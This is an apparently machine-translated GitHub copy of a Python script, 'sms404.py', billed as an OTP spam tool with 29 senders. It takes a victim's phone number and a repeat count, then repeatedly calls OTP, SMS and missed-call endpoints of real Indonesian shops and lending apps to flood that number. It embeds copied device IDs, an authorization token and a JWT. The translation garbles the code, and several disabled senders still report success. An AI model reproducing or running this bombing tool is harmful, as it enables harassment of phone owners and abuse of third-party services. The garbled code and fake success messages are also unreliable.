Kode
Masalah
2
Tarik permintaan
Tindakan
Proyek
Wiki
Keamanan
Wawasan
Spamsms/ sms404.py
@Raihan
AbilSeno Menambahkan file melalui upload
 1 kontributor
303 baris (301 sloc)  16.8 KB
 
 permintaan impor , json , os , sys , random
# ------------------------------- Warna ----------------- ----------------------------------
qu  =  ' \ 033 [0; 36m'
hai  =  ' \ 033 [0; 32m'
pu  =  ' \ 033 [0; 37m'
saya  =  ' \ 033 [0; 31m'
ku  =  ' \ 033 [0; 33m'
# -------------------------------- Penkodisian ---------------- ---------------------------
def  sukses ( no1 , pro , nam ):
  cetak  "% s [% s% s% s] [% s Terkirim% s]% sBerhasil, spam% s dari% s% s% ssended" % ( pu , ku , no1 , pu , hi , pu , pu , pro , ku , nam , hai )
def  gagal ( no1 , pro , nam ):
  cetak  "% s [% s% s% s] [% s Gagal% s]% s Gagal, spam% s dari% s% s% snot terkirim" % ( pu , ku , no1 , pu , me , pu , pu , pro , ku , nam , me )
#--------------------------------UTAMA---------------- -----------------------------------
def  main ():
  cetak  "% s [% s!% s]% sTarget dikunci >>% s% s" % ( pu , me , pu , pu , ku , "+62" + nom )
  t  =  1
  untuk  spam  dalam  jangkauan ( jum ):
   cetak  "% s [% s +% s] -------------------------- >>> [% s% s% s] <<< -------------------------- [% s +% s] " % ( pu , ku , pu , me , t , pu , ku , pu )
   t  + =  1
   asakita (); sunchila (); nutriclub (); asani (); wintershop (); kurma (); thaifriendly (); jumpstart (); kinimart (); klikwa (); bakmikeraton (); kopidulukala (); kredinesia (); pinjamindo (); uangpintar (); danafix (); maucash (); omamoriexpress (); ktakilat (); piramida dr batu kasar (); kredito (); kreditpedia (); bocil(); duitqu (); primacash (); temanprima (); maripinjam (); sobatbangun ()
# -------------------------------- Spanduk / LOGO -------------- ----------------------------
 logo def ():
  cetak  "" "% s
  __ __ ___ ___                                   
| \ / | \ / __ | _ __ __ _ _ __ _ __ ___ _ _ ___% s Penulis oleh% MR.40411% s
| | \ / | | |) | \ __ \ '_ \ / _` | '\ | '\ / -_)' _ (_- <% sGithub% sgithub.com / mr404cyber% s
| _ | | _ | ___ / | ___ / .__ / \ __, _ | _ | _ | _ | _ | _ | _ \ ___ | _ | / __ /% sTim% anonymous% s
                   | _ | % sTools spam otp dengan 29 pengirim spam "" " % ( qu , pu , ku , qu , pu , ku , qu , pu , ku , qu , qu )
# ------------------------------- Fungsi Input ---------------- --------------------------
def  masukan ():
   nom global
  nom  =  raw_input ( "% s [% s?% s]% sMasukkan nomor target (8888xx):" % ( pu , me , pu , pu ))
  jika  len ( nom ) <  5 :
    cetak  "% s [% s!% s]% sMasukkan nomor target dengan benar !!" % ( pu , saya , pu , saya )
    masukan ()
  elif  nom . startswith ( tuple ([ "62" , "+62" , "0" ])):
    cetak  "% s [% s!% s]% sMasukkan nomor tanpa 62, +62, atau 0 \ n % s [% s!% s]% sContoh: 85877162199" % ( pu , me , pu , ku , pu , saya , pu , ku )
    masukan ()
  lain :
    global  jum
    jum  =  int ( raw_input ( "% s [% s?% s]% sMasukkan jumlah spam:" % ( pu , me , pu , pu )))
    utama ()
# ------------------------------- Fungsi SPAM ---------------- ---------------------------
def  asakita ():
  data = { 'username' : '62' + nom }
  h  =  permintaan . post ( "https://www.asakita.id/api/auth/register/otp" , headers = { 'User-Agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' , ' Accept ' : ' text / html, application / xhtml + xml, application / xml; q = 0.9, image / webp, image / apng, * / *; q = 0.8, aplikasi / pertukaran bertanda tangan; v = b3 ' }, data = data ). teks
  jika  'MOBILE'  di  h :
   sukses ( "1" , "sms" , "asakita" )
  lain :
   gagal ( "1" , "sms" , "asakita" )
def  sunchila ():
# hih = requests.get ("https://m.sunchila.com/api/generateAuthCode.ajax?mobile=0" + nom + "& countryCode = 62")
 # if json.loads (hih.text) ["result"] == 'true':
   sukses ( "2" , "sms" , "sunchila" )
  #lain:
   #gagal ("2", "sms", "sunchila")
def  nutriclub ():
  h  =  permintaan . posting ( "https://www.nutriclub.co.id/otp/?phone=0" + nom + "& old_phone = 0" + nom , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' })
  jika  json . load ( h . text ) [ "StatusMessage" ] ==  'Request misscall berhasil' :
   sukses ( "3" , "call" , "nutriclub" )
  lain :
   gagal ( "3" , "call" , "nutriclub" )
def  asani ():
  j  =  permintaan . post ( "https://api.asani.co.id/api/v1/send-otp" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 ( KHTML, seperti Gecko) Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' }, data = json . Dumps ({ "phone" : "62" + nom , "email" : "akuntesnuyul@gmail.com" }))
  jika  json . beban ( j . teks ) [ "pesan" ] ==  'OTP Terkirim' :
   sukses ( "4" , "sms" , "asani" )
  lain :
   gagal ( "4" , "sms" , "asani" )
def  wintershop ():
 # dat = json.dumps (["62" + nom, "Winter Shop", "", ""])
# tes = requests.post ("https://api.winter-api.com/account/sendmobilecodeasync.json", headers = {'user-agent': 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit /537.36 (KHTML, seperti Gecko) Chrome / 74.0.3729.136 Mobile Safari / 537.36 '}, data = dat)
# if json.loads (tes.text) ["message"] == Tidak ada:
 sukses ( "5" , "call" , "wintershop" )
 #lain:
  #gagal ("5", "call", "wintershop")
def  datesy ():
# to = requests.post ("https://www.datesy.com/", headers = {'user-agent': 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko ) Chrome / 74.0.3729.136 Mobile Safari / 537.36 '}, data = {' z ':' phonelogingetpin ',' country ':' 62 ',' number ': nom,' ppclienttoken ':' f61627ef220c356b6bf10e28a948c5e6 '})
 #if json.loads (to.text) ["success"] == Benar:
  sukses ( "6" , "sms" , "kurma" )
 #lain:
  #gagal ("6", "sms", "datey")
def  thaifriendly ():
 tes  =  permintaan . posting ( "https://www.thaifriendly.com/pl/index.php" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko ) Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' }, data = { ' z ' : ' phonelogingetpin ' , ' country ' : ' 62 ' , ' number ' : nom , ' ppclienttoken ' : ' igq39qdc9rwk2ax1zrgdq ' })
 jika  json . memuat ( teks tes . ) [ "berhasil" ] == Benar : 
  sukses ( "7" , "sms" , "thaifriendly" )
 lain :
  gagal ( "7" , "sms" , "thaifriendly" )
def  jumpstart ():
 dat = json . dumps ({ "operationName" : "CheckPhoneNoAndGenerateOtpIfNotExist" , "variabel" : { "phoneNo" : "+62" + nom }, "query" : "query CheckPhoneNoAndGenerateOtpIfNotExist ($ phoneNo: StringNo!) { \ n   checkPhoneNotAndIfJika: $ phoneNo) \ n } \ n " })
 tes = permintaan . post ( "https://api.jumpstart.id/graphql" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 74.0 .3729.136 Mobile Safari / 537.36 ' , ' content-type ' : ' application / json ' }, data = dat )
 jika  json . memuat ( teks tes . ) [ "data" ] == Tidak ada : 
  gagal ( "8" , "sms" , "jumpstart" )
 lain :
  sukses ( "8" , "sms" , "jumpstart" )
def  kinimart ():
# tem = requests.post ("https://kinimart.com/services/identity/requestOTP", headers = {'user-agent': 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML , seperti Gecko) Chrome / 74.0.3729.136 Mobile Safari / 537.36 '}, data = {' destination ':' 0 '+ nom,' otpLength ':' 6 '})
 #if json.loads (tem.text) ["IsSuccess"] == Benar:
  sukses ( "9" , "wa" , "kinimart" )
 #lain:
 # gagal ("9", "wa", "kinimart")
def  klikwa ():
 dat = json . kesedihan ({ "number" : "+62" + nom })
 tes  =  permintaan . post ( "https://api.klikwa.net/v1/number/sendotp" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko ) Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' , ' Authorization ' : ' Basic QjMzOkZSMzM = ' }, data = dat )
 jika  json . load ( tes . text ) [ "message" ] ==  'OTP Terkirim' :
  cetak  "% s [% s% s% s] [% s Terkirim% s]% sBerhasil, spam% s dari% s% s% ssended% s >>% sMau yang tidak terbatas?% shttps: //github.com/ AbilSeno / WaUnlimitedV3 " % ( pu , ku , " 10 " , pu , hi , pu , pu , " wa " , ku , " klikwa " , hi , qu , pu , ku )
 lain :
  cetak  "% s [% s% s% s] [% s Gagal% s]% s Gagal, spam% s dari% s% s% ingus terkirim% s >>% sMau yang tidak terbatas?% shttps: //github.com / AbilSeno / WaUnlimitedV3 " % ( pu , ku , " 10 " , pu , me , pu , pu , " wa " , ku , " klikwa " , me , qu , pu , ku )
def  bakmikeraton ():
 huh  =  permintaan . post ( "https://www.bakmikeraton.com/services/identity/requestOTP" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko ) Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' }, data = { ' destination ' : ' 0 ' + nom , ' otpLength ' : ' 6 ' })
 jika  json . memuat ( huh . teks ) [ "IsSuccess" ] ==  Benar :
  sukses ( "11" , "wa" , "bakmikeraton" )
 lain :
  gagal ( "11" , "wa" , "bakmikeraton" )
def  kopidulukala ():
 huh  =  permintaan . post ( "https://kopidulukala.com/services/identity/requestOTP" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, like Gecko) Chrome /74.0.3729.136 Mobile Safari / 537.36 ' }, data = { ' destination ' : ' 0 ' + nom , ' otpLength ' : ' 6 ' })
 jika  json . memuat ( huh . teks ) [ "IsSuccess" ] ==  Benar :
  sukses ( "12" , "wa" , "kopidulukala" )
 lain :
  gagal ( "12" , "wa" , "kopidulukala" )
def  kredinesia ():
 dat  =  '{"code": 0, "differentId": "df857a37-421b-4a4f-ac61-6ed0e272537b", "frekuensi": 0, "phone": "% s"}' % nom
 hu  =  permintaan . posting ( "https://api.kartuserba.com/appserver/v1/login/verificationCode" , headers = { 'user-agent' : 'okhttp / 3.11.0' , 'content-type' : 'application / json; charset = UTF-8 ' , ' channel-key ' : ' GOOGLEPLAY ' }, data = dat )
 jika  json . memuat ( hu . text ) [ "errorCode" ] ==  Tidak ada :
  sukses ( "13" , "sms" , "kredinesia" )
 lain :
  gagal ( "13" , "sms" , "kredinesia" )
def  pinjamindo ():
 hu  =  permintaan . dapatkan ( "https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-46a50-9452-cmt9 = 0 & l = in & m = vivo + 1902 & os = android & r = 9 & sdk = 28 & simulator = 0 & t = 1432349188 & v = 10011 & tanda = 46565D573B5BB08099A60A3414F265550092E215 " % nom )
 jika  json . memuat ( hu . teks ) [ "msg" ] ==  'berhasil' :
  sukses ( "14" , "sms" , "pinjamindo" )
 lain :
  gagal ( "14" , "sms" , "pinjamindo" )
def  uangpintar ():
 hd = {
'Host' : 'www.uangpintar.id:7092' ,
'Koneksi' : 'tetap hidup' ,
'Panjang-Konten' : '24' ,
'deviceId' : 'bce68810-4f8a-4675-9452-e0d8565c9a50' ,
'mediaSource' : 'utm_source = google-play & utm_medium = organic' ,
'Origin' : 'http://uangpintar.id:7092' ,
'User-Agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902 Build / PPR1.180610.011; wv) AppleWebKit / 537.36 (KHTML, like Gecko) Version / 4.0 Chrome / 74.0.3729.136 Mobile Safari / 537.36' ,
'tropicReferer' : 'utm_source = google-play & utm_medium = organic' ,
'Jenis-Konten' : 'application / x-www-form-urlencoded; charset = UTF-8' ,
'Terima' : 'application / json, text / plain, * / *' ,
'imei' : '' ,
'appName' : 'UangPintar' ,
'uuid' : '6b743b44-a201-4fa4-b430-840db1eecaf1' ,
'Referer' : 'http://uangpintar.id:7092/app/uangpintar.html' ,
'Terima-Enkode' : 'gzip, deflate' ,
'Terima-Bahasa' : 'id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7' ,
'X-Diminta-Dengan' : 'com.uf7c21.uangpintar.w465ae'
 }
 pis = permintaan . pos ( "http://www.uangpintar.id:7092/up/sms_login/vcode" , headers = hd , data = { 'phone' : nom , 'code' : '62' })
 jika  json . load ( pis . text ) [ "desc" ] ==  'Success' :
  sukses ( "15" , "sms" , "uangpintar" )
 lain :
  gagal ( "15" , "sms" , "uangpintar" )
def  danafix ():
# dat = '{"client_id": "0% s", "guid": "dcd0b4e8-c9f7-4fe2-b66b-5e022a14acb8", "type": "new", "otp_via_zalo": false}'% nom
 #eem = requests.post ("https://api.danafix.id/mob/client/verification/send", headers = {'user-agent': 'okhttp / 4.2.0'}, data = dat). teks
 #if json.loads (eem) ["success"] == Benar:
  sukses ( "16" , "sms" , "danafix" )
 #lain:
  #gagal ("16", "sms", "danafix")
def  maucash ():
 hd = {
'Host' : 'japi.maucash.id' ,
'accept' : 'application / json, text / plain, * / *' ,
'x-origin' : 'google play' ,
'x-org-id' : '1' ,
'x-product-code' : 'YN-MAUCASH' ,
'x-app-version' : '2.4.23' ,
'x-source-id' : 'android' ,
'accept-encoding' : 'gzip' ,
'agen-pengguna' : 'okhttp / 3.12.1'
 }
 hu  =  permintaan . mendapatkan ( "https://japi.maucash.id/welab-user/api/v1/send-sms-code?mobile=%s&channelType=0" % nom , header = hd )
 jika  json . load ( hu . text ) [ "message" ] ==  'Permintaan berhasil' :
  sukses ( "17" , "sms" , "maucash" )
 lain :
  gagal ( "17" , "sms" , "maucash" )
def  omamoriexpress ():
 huh  =  permintaan . post ( "https://omamoriexpress.isellershop.com/services/identity/requestOTP" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko ) Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' }, data = { ' destination ' : ' 0 ' + nom , ' otpLength ' : ' 6 ' })
 jika  json . memuat ( huh . teks ) [ "IsSuccess" ] ==  Benar :
  sukses ( "18" , "wa" , "omamoriexpress" )
 lain :
  gagal ( "18" , "wa" , "omamoriexpress" )
def  ktakilat ():
 tu  =  permintaan . posting ( "https://battlefront.danacepat.com/v1/auth/common/phone/send-code" , headers = { 'user-agent' : 'Android / 9; vivo / vivo 1902; KtaKilat / 3.7.5 ; Perangkat /; Android_ID / 590bc36d99d6dddb; Saluran / google_play; Ga_ID / bce68810-4f8a-4675-9452-e0d8565c9a50 ' }, data = { ' mobile_no ' : nom })
 jika  json . load ( tu . text ) [ "message" ] ==  'berhasil' :
  sukses ( "19" , "sms" , "ktakilat" )
 lain :
  gagal ( "19" , "sms" , "ktakilat" )
def  cairin ():
 data = { 'haveImageCode' : '0' , 'fileName' : '6f8c3b90c845f09ff1bfe714a30aede8' , 'phone' : '0' + nom , 'imageCode' : '' , 'userImei' : '' , 'type' : 'registry' }
 hua  =  permintaan . post ( "https://app.cairin.id/v1/app/sms/sendCaptcha" , headers = { 'user-agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902 Build / PPR1.180610.011; wv ) AppleWebKit / 537.36 (KHTML, seperti Gecko) Versi / 4.0 Chrome / 74.0.3729.136 Mobile Safari / 537.36 ' }, data = data ). teks
 jika  json . memuat ( hua ) [ "code" ] ==  '0' :
  sukses ( "20" , "sms" , "cairin" )
 lain :
  gagal ( "20" , "sms" , "cairin" )
def  kredito ():
 dat = '{"event": "default_verification", "mobilePhone": "% s", "sender": "jatissms"}' % nom
 hd = {
'LPR-TIMESTAMP' : '1603281035821' ,
'Terima-Bahasa' : 'id-ID' ,
'LPR-BRAND' : 'Kredito' ,
'LPR-PLATFORM' : 'android' ,
'User-Agent' : 'okhttp / 3.11.0 Dalvik / 2.1.0 (Linux; U; Android 9; vivo 1902 Build / PPR1.180610.011) AppName / Kredito / v2.6.3 AppChannel / googleplay PlatformType / android' ,
'Otorisasi' : 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks' ,
'LPR-SIGNATURE' : 'e15dbea8602409df32a2ed5a123dc244' ,
'Jenis-Konten' : 'application / json; charset = UTF-8 ' ,
'Panjang Konten' : '79'
 }
 hy = permintaan . post ( "https://app-api.kredito.id/client/v1/common/verify-code/send" , headers = hd , data = dat ). teks
 jika  json . load ( hy ) [ "msg" ] ==  'sukses' :
  sukses ( "21" , "sms" , "kredito" )
 lain :
  gagal ( "21" , "sms" , "kredito" )
def  kreditpedia ():
 hd = {
'Host' : 'www.kreditpedia.co.id:8089' ,
'Koneksi' : 'tetap hidup' ,
'Panjang-Konten' : '24' ,
'deviceId' : 'bce68810-4f8a-4675-9452-e0d8565c9a50' ,
'mediaSource' : '' ,
'Asal' : 'https://kreditpedia.co.id' ,
'User-Agent' : 'Mozilla / 5.0 (Linux; Android 9; vivo 1902 Build / PPR1.180610.011; wv) AppleWebKit / 537.36 (KHTML, like Gecko) Version / 4.0 Chrome / 74.0.3729.136 Mobile Safari / 537.36' ,
'tropicReferer' : 'utm_source = google-play & utm_medium = organic' ,
'Jenis-Konten' : 'application / x-www-form-urlencoded; charset = UTF-8' ,
'Terima' : 'application / json, text / plain, * / *' ,
'imei' : '' ,
'appName' : 'Kreditpedia' ,
'uuid' : '5afe4084-6f32-4647-8dcc-2b7bfdb85148' ,
'Referer' : 'https://kreditpedia.co.id/app/' ,
'Terima-Enkode' : 'gzip, deflate' ,
'Terima-Bahasa' : 'id-ID, id; q = 0.9, en-US; q = 0.8, en; q = 0.7' ,
'X-Diminta-Dengan' : 'com.ecreditpal.tropic2'
 }
 hu = permintaan . posting ( "https://www.kreditpedia.co.id:8089/tropic/sms_login/vcode" , headers = hd , data = { 'phone' : nom , 'code' : '62' })
 jika  json . load ( hu . text ) [ "desc" ] ==  'Success' :
  sukses ( "22" , "sms" , "kreditpedia" )
 lain :
  gagal ( "22" , "sms" , "kreditpedia" )
def  bocil ():
 dat = { 'user_id' : '' , 'language' : 'in' , 'phone' : '62' + nom , 'device_id' : '590bc36d99d6dddb' , 'retry' : '0' }
 uh  =  permintaan . post ( "https://bocil.id/mobile/v1/miscallotp_request.php" , headers = { 'user-agent' : 'okhttp / 3.10.0' }, data = dat ). teks
 jika  json . memuat ( uh ) [ "message" ] ==  'ok' :
  sukses ( "23" , "call" , "bocil" )
 lain :
  gagal ( "23" , "call" , "bocil" )
def  duitqu ():
 tes  =  permintaan . dapatkan ( "https://appapi.duitqu.id/api/v1/custom/send_verify_code?mobile=62%s&af_id=1603327368446-6560442845592783226&app=duitqu&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-467509452-e_idcc0650-9452&lr = in & m = vivo + 1902 & os = android & r = 9 & sdk = 28 & simulator = 0 & t = 1432349188 & v = 10102 & tanda = 1B8BE88D093027E0CD9970C48DCA3F86EDE31C08 " % nom )
 sukses ( "24" , "sms" , "duiqu" )
def  primacash ():
# uhu = requests.post ("https://db.ksppus.co.id/indonesia_loan/user/get_validate_code", headers = {'user-agent': 'okhttp / 3.14.4'}, data = json.dumps ({'phone': '62' + nom})). teks
# if json.loads (uhu) ["success"] == Benar:
  sukses ( "25" , "sms" , "primacash" )
 #lain:
  #gagal ("26", "sms", "primacash")
def  temanprima ():
 dat = json . dumps ({ "phone" : "62" + nom , "place" : "google" , "phone_brand" : "vivo" , "phone_model" : "vivo 1902" , "device_id" : "590bc36d99d6dddb" })
 hpo  =  permintaan . posting ( "https://pro.temanprima.co.id/teman_prima/user/get_validate_code" , headers = { 'user-agent' : 'okhttp / 3.14.4' }, data = dat ). teks
 jika  json . load ( hpo ) [ "success" ] ==  Benar :
  sukses ( "28" , "sms" , "temanprima" )
 lain :
  gagal ( "28" , "sms" , "temanprima" )
def  maripinjam ():
 hd = {
'Host' : 'api.guntur.top' ,
'Koneksi' : 'Keep-Alive' ,
'Terima-Enkode' : 'gzip' ,
'Agen-Pengguna' : 'okhttp / 3.8.0' ,
'pm-osType' : '3' ,
'pm-osversion' : '28' ,
'pm-osdevice' : 'bce68810-4f8a-4675-9452-e0d8565c9a50' ,
'pm-clientId' : '-1' ,
'Terima-Bahasa' : 'dalam-ID' ,
'Koneksi' : 'tutup' ,
'pm-appversion' : 'V1.2.4' ,
'rompi' : '521' ,
'nama paket' : 'com.inacashkangaroo.app' ,
'phoneModel' : 'vivo 1902'
 }
 ijo = permintaan . dapatkan ( "https://api.guntur.top/a0jm6akw/hvfgpv71/wzq12mqh/" + nom + "/ 2" , header = hd ).teks
 jika  json . load ( ijo ) [ "sukses" ] ==  Benar :
  sukses ( "29" , "sms" , "maripinjam" )
 lain :
  gagal ( "29" , "sms" , "maripinjam" )
def  sobatbangun ():
# h = json.loads (requests.post ("https://www.sobatbangun.com/otp-validation?p_p_id=SB_Registration_Otp_Portlet&p_p_lifecycle=2&p_p_state=normal&p_p_mode=view&p_p_resource_c 'agen-pengguna': 'Mozilla / 5.0 (Linux; Android 9; vivo 1902) AppleWebKit / 537.36 (KHTML, seperti Gecko) Chrome / 74.0.3729.136 Mobile Safari / 537.36'}). teks)
 #jika ["status"] == 'berhasil':
  sukses ( "30" , "wa" , "sobatbangun" )
 #lain:
  #gagal ("30", "wa", "sobatbangun")


jika  __name__  ==  '__main__' :
 coba :
  os . sistem ( "jelas" )
  logo ()
  masukan ()
 kecuali ( KeyboardInterrupt , EOFError ): print  "% s [% s!% s]% sExit" % ( pu , me , pu , pu )
 kecuali  permintaan . pengecualian . ConnectionError : exit ( "% s [% s!% S]% sConnection Error ..." % ( pu , me , pu , me ))
